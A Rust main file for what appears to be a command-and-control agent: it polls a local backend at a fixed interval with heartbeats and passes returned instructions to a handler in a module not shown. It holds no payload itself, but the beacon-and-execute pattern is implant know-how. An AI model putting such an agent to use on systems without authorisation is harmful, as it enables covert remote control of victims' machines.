pub mod agent;
pub mod harpe;
pub mod network;

use agent::AgentContext;
use std::time::Duration;
use talaria::helper::*;
use tokio::time::sleep;

// FIXME:
// Constants to be backed into the binary
// We can look into using `include_bytes!()` in the future
const BACKEND_SERVER_ADDR: &str = "http://127.0.0.1";
const BACKEND_SERVER_PORT: u16 = 8000;
const POLLING_INTERVAL_MILLIS: u64 = 10000;

#[tokio::main]
async fn main() {
    // Create the agent context
    let mut agent = AgentContext::new(
        BACKEND_SERVER_ADDR,
        BACKEND_SERVER_PORT,
        POLLING_INTERVAL_MILLIS,
    );

    // Main agent loop
    loop {
        match network::send_heartbeat(&mut agent).await {
            Ok(instruction) => match network::handle_response(&mut agent, instruction).await {
                Ok(_) => {}
                Err(err) => devlog!("Failed to handle response\n{:?}", err),
            },
            Err(err) => devlog!("Failed to communicate with server\n{:?}", err),
        }

        // FIXME: whoever wrote this does not understand the nature of async code (me [cole])
        // we are waiting X amount of time from the end of the last execution,
        // meaning if we intend to call function Y every X seconds, we are actually
        // calling function Y every X + N seconds, where N is the execution time of Y
        sleep(Duration::from_millis(agent.polling_interval_millis)).await;
    }
}
